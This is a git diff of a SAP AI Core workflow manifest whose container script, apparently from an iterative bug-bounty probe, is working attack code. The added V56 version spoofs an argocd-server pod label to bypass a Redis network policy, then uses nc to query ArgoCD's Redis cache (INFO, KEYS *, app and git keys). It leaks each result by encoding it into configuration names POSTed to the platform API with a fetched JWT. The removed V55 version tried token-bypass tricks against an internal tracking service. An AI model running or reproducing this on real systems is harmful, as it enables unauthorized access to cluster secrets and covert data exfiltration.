@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "55.0.0"
+    ai.sap.com/version: "56.0.0"
 spec:
   entrypoint: main
   templates:
@@ -18,13 +18,16 @@ spec:
     metadata:
       labels:
         ai.sap.com/resourcePlan: starter
+        app.kubernetes.io/name: argocd-server
     container:
       image: nicolaka/netshoot:latest
       command:
       - bash
       - -c
       - |
-        # V55: Hit tracking API WITH our XSUAA JWT
+        # V56: ArgoCD Redis cache access via label spoofing (GH #17151)
+        # Redis network policy uses podSelector labels WITHOUT namespaceSelector
+        # If our pod has matching labels, network policy allows access
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -35,64 +38,94 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v55-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v56-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        EXEC_ID=$(printenv AICORE_EXECUTION_ID)
+        # Check what labels our pod actually has
+        LABELS=$(cat /etc/podinfo/labels 2>/dev/null || echo "no-podinfo")
+        save "pod-labels-$(echo $LABELS | head -c 150)"
 
-        # 1. With XSUAA Bearer token
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
-        save "jwt-root-$(echo $R | head -c 150)"
+        # Redis service names from KSM data
+        REDIS_HA="argocd-redis-ha-haproxy.argocd.svc.cluster.local"
+        REDIS_DIRECT="argocd-redis-ha.argocd.svc.cluster.local"
 
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/v1" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
-        save "jwt-apiv1-$(echo $R | head -c 150)"
+        # 1. DNS resolution
+        REDIS_IP=$(dig +short "$REDIS_HA" 2>/dev/null | head -1)
+        save "redis-ha-ip-${REDIS_IP:-NXDOMAIN}"
 
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Authorization: Bearer $JWT" 2>&1 | head -c 200)
-        save "jwt-experiments-$(echo $R | head -c 150)"
+        REDIS_D_IP=$(dig +short "$REDIS_DIRECT" 2>/dev/null | head -1)
+        save "redis-direct-ip-${REDIS_D_IP:-NXDOMAIN}"
 
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/runs/search" -H "Authorization: Bearer $JWT" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0"]}' 2>&1 | head -c 200)
-        save "jwt-runs-$(echo $R | head -c 150)"
-
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/v1/metrics" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "jwt-v1metrics-$(echo $R | head -c 150)"
-
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/v2/lm/metrics" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "jwt-v2metrics-$(echo $R | head -c 150)"
-
-        # 2. With empty Bearer
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer " 2>&1 | head -c 200)
-        save "empty-root-$(echo $R | head -c 150)"
-
-        # 3. With just "Bearer" (no space after)
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer" 2>&1 | head -c 200)
-        save "nospace-root-$(echo $R | head -c 150)"
-
-        # 4. With execution ID as token
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/" -H "Authorization: Bearer ${EXEC_ID}" 2>&1 | head -c 200)
-        save "execid-root-$(echo $R | head -c 150)"
-
-        # 5. With AI-Resource-Group header + JWT
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "Authorization: Bearer $JWT" \
-          -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "jwt-rg-experiments-$(echo $R | head -c 150)"
-
-        # 6. Try SAP-specific tracking paths with JWT
-        for path in "/v2/lm/executions/${EXEC_ID}/metrics" "/v2/lm/executions" "/api/v1/tracking/executions" "/api/v1/tracking/metrics"; do
-          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-          SAFEPATH=$(echo "$path" | tr '/' '-')
-          save "jwt${SAFEPATH}-$(echo $R | head -c 130)"
+        # Also try the announce services
+        for i in 0 1 2; do
+          ip=$(dig +short "argocd-redis-ha-announce-${i}.argocd.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && save "redis-announce-${i}-${ip}"
         done
 
-        # 7. Try cross-RG access on tracking
-        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
-          -H "Authorization: Bearer $JWT" \
-          -H "AI-Resource-Group: bb-test-rg" 2>&1 | head -c 200)
-        save "jwt-crossrg-$(echo $R | head -c 150)"
+        # 2. Try connecting to Redis (default port 6379)
+        if [ -n "$REDIS_IP" ]; then
+          # TCP connection test
+          R=$(echo "PING" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 100)
+          save "redis-ping-$(echo $R | head -c 80)"
 
-        echo "V55 DONE" >&2
+          # Try Redis INFO command
+          R=$(echo -e "INFO\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
+          save "redis-info-$(echo $R | head -c 150)"
+
+          # Try KEYS * to list all cached keys
+          R=$(echo -e "KEYS *\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
+          save "redis-keys-$(echo $R | head -c 150)"
+        fi
+
+        # 3. Try HAProxy port (usually 6379 or 26379)
+        if [ -n "$REDIS_IP" ]; then
+          for port in 6379 26379 6380; do
+            R=$(echo "PING" | nc -w 2 "$REDIS_IP" "$port" 2>&1 | head -c 80)
+            if [ -n "$R" ]; then
+              save "redis-ha-${port}-$(echo $R | head -c 60)"
+            fi
+          done
+        fi
+
+        # 4. Try direct Redis pods (not through HAProxy)
+        if [ -n "$REDIS_D_IP" ]; then
+          R=$(echo "PING" | nc -w 3 "$REDIS_D_IP" 6379 2>&1 | head -c 100)
+          save "redis-d-ping-$(echo $R | head -c 80)"
+
+          R=$(echo -e "INFO\r\n" | nc -w 3 "$REDIS_D_IP" 6379 2>&1 | head -c 200)
+          save "redis-d-info-$(echo $R | head -c 150)"
+        fi
+
+        # 5. Try announce IPs directly
+        for i in 0 1 2; do
+          ip=$(dig +short "argocd-redis-ha-announce-${i}.argocd.svc.cluster.local" 2>/dev/null | head -1)
+          if [ -n "$ip" ]; then
+            R=$(echo "PING" | nc -w 2 "$ip" 6379 2>&1 | head -c 80)
+            save "redis-a${i}-ping-$(echo $R | head -c 60)"
+          fi
+        done
+
+        # 6. If Redis responds, try to read ArgoCD app data
+        if [ -n "$REDIS_IP" ]; then
+          # ArgoCD stores apps in Redis with key pattern: app|*
+          R=$(echo -e "KEYS app|*\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
+          save "redis-app-keys-$(echo $R | head -c 200)"
+
+          # Try getting our gitops app's cached data
+          R=$(echo -e "GET app|ghe-gitops-app\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
+          save "redis-gitops-app-$(echo $R | head -c 200)"
+
+          # Try MGET for manifest cache
+          R=$(echo -e "KEYS git-*\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 300)
+          save "redis-git-keys-$(echo $R | head -c 200)"
+
+          # Check cluster info
+          R=$(echo -e "CLUSTER INFO\r\n" | nc -w 3 "$REDIS_IP" 6379 2>&1 | head -c 200)
+          save "redis-cluster-$(echo $R | head -c 150)"
+        fi
+
+        echo "V56 DONE" >&2
